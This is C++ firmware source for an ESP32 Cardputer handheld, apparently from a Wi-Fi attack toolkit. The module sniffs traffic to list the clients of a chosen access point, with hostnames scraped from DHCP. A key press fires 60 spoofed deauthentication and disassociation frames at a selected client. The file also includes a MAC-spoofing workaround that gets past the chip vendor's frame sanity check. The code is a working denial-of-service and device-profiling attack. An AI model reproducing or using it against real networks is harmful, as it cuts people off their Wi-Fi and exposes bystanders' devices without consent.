/*
 * wifi_clients — list STA clients connected to a target AP.
 *
 * Locks channel to the target AP, listens for data frames going to or
 * from that BSSID, extracts the STA MAC(s). Shows a live table of
 * seen clients with last-seen timestamp and RSSI.
 *
 * Press D on a highlighted client to deauth just that one (unicast
 * deauth to the client MAC spoofed-from the AP).
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include "ble_db.h"
#include "dhcp_cache.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_CLIENTS 16

struct cli_t {
    uint8_t  mac[6];
    int8_t   rssi;
    uint32_t last_seen;
    uint32_t frames;
};

static cli_t    s_clients[MAX_CLIENTS];
static volatile int s_count = 0;
static uint8_t  s_target[6];
static uint8_t  s_target_ch = 1;

/* Capture data frames going to/from our target BSSID, extract the
 * "other" MAC (the STA). */
static void client_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t fc = p[1];
    uint8_t from_ds = (fc >> 1) & 1;
    uint8_t to_ds   = (fc)      & 1;

    const uint8_t *bssid;
    const uint8_t *sta;
    if (to_ds && !from_ds) {        /* STA → AP: addr1=BSSID, addr2=STA */
        bssid = p + 4;  sta = p + 10;
    } else if (from_ds && !to_ds) { /* AP → STA: addr1=STA, addr2=BSSID */
        bssid = p + 10; sta = p + 4;
    } else {
        return;
    }

    if (memcmp(bssid, s_target, 6) != 0) return;

    /* Try to scoop a hostname from DHCP on this frame. */
    dhcp_try_parse_802_11(p, pkt->rx_ctrl.sig_len);

    int idx = -1;
    for (int i = 0; i < s_count; ++i) {
        if (memcmp(s_clients[i].mac, sta, 6) == 0) { idx = i; break; }
    }
    if (idx < 0) {
        if (s_count >= MAX_CLIENTS) return;
        idx = s_count++;
        memcpy(s_clients[idx].mac, sta, 6);
        s_clients[idx].frames = 0;
    }
    s_clients[idx].rssi      = pkt->rx_ctrl.rssi;
    s_clients[idx].last_seen = millis();
    s_clients[idx].frames++;
}

/* Targeted deauth: AP → STA (client), spoofed sender = AP.
 * Fires 30 deauth+disassoc pairs = 60 frames at ~5ms spacing.
 *
 * Spoofs STA MAC to target BSSID before TX so the stock ESP-IDF blob
 * doesn't drop every frame at ieee80211_raw_frame_sanity_check. */
static void deauth_client(const uint8_t *client)
{
    static uint16_t seq = 0;
    if (seq == 0) seq = (uint16_t)(esp_random() & 0x0FFF);

    esp_err_t mac_rc = wifi_ap_spoof_begin(s_target);
    Serial.printf("[clients] ap_spoof rc=%d\n", (int)mac_rc);

    esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 30; ++i) {
        wifi_deauth_pair(client, s_target, &seq);
        delay(5);
    }

    wifi_ap_spoof_end();
}

void feat_wifi_clients(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    if (!g_last_selected_valid) {
        ui_toast("scan + select AP first", T_WARN, 1500);
        return;
    }
    memcpy(s_target, g_last_selected_ap.bssid, 6);
    s_target_ch = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;

    static int s_saved_cursor = 0;
    static uint8_t s_saved_for[6] = {0};
    /* Only clear the client list if we're looking at a different AP. */
    if (memcmp(s_saved_for, s_target, 6) != 0) {
        s_count = 0;
        s_saved_cursor = 0;
        memcpy(s_saved_for, s_target, 6);
    }
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(client_cb);
    esp_wifi_set_channel(s_target_ch, WIFI_SECOND_CHAN_NONE);

    int cursor = s_saved_cursor;
    ui_draw_footer(";/.=move  D=deauth one  `=back");
    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 2);
            d.printf("CLIENTS  %d  ch%u", s_count, s_target_ch);
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 14);
            d.printf("%.24s", g_last_selected_ap.ssid);

            if (s_count == 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 34);
                d.print("no traffic yet. waiting...");
                d.setCursor(4, BODY_Y + 46);
                d.print("try running deauth to");
                d.setCursor(4, BODY_Y + 58);
                d.print("force reconnects.");
            } else {
                int rows = 7;
                if (cursor < 0) cursor = 0;
                if (cursor >= s_count) cursor = s_count - 1;
                int first = cursor - rows / 2;
                if (first < 0) first = 0;
                if (first + rows > s_count) first = max(0, s_count - rows);

                for (int r = 0; r < rows && first + r < s_count; ++r) {
                    const cli_t &c = s_clients[first + r];
                    int y = BODY_Y + 28 + r * 11;
                    bool sel = (first + r == cursor);
                    uint16_t bg = sel ? 0x18C7 : T_BG;
                    if (sel) d.fillRect(0, y - 1, SCR_W, 11, bg);

                    uint32_t oui = ((uint32_t)c.mac[0] << 16) |
                                   ((uint32_t)c.mac[1] << 8) |
                                    (uint32_t)c.mac[2];
                    const char *vendor   = ble_db_oui(oui);
                    const char *hostname = dhcp_hostname(c.mac);

                    /* Hostname wins over vendor. */
                    if (hostname) {
                        d.setTextColor(sel ? T_ACCENT : T_GOOD, bg);
                        d.setCursor(4, y); d.printf("%-14.14s", hostname);
                    } else if (vendor) {
                        d.setTextColor(sel ? T_ACCENT : T_WARN, bg);
                        d.setCursor(4, y); d.printf("%-14.14s", vendor);
                    } else {
                        d.setTextColor(T_DIM, bg);
                        d.setCursor(4, y); d.print("?");
                    }
                    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
                    d.setCursor(90, y);
                    d.printf("%02X:%02X:%02X", c.mac[3], c.mac[4], c.mac[5]);
                    d.setTextColor(T_DIM, bg);
                    d.setCursor(146, y);
                    d.printf("%3d %lu", c.rssi, (unsigned long)c.frames);
                }
            }
            ui_draw_status(radio_name(), "clients");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { if (cursor + 1 < s_count) cursor++; }
        if ((k == 'd' || k == 'D') && s_count > 0 && cursor < s_count) {
            deauth_client(s_clients[cursor].mac);
            ui_toast("deauth sent", T_BAD, 600);
        }
    }

    esp_wifi_set_promiscuous(false);
    s_saved_cursor = cursor;
}
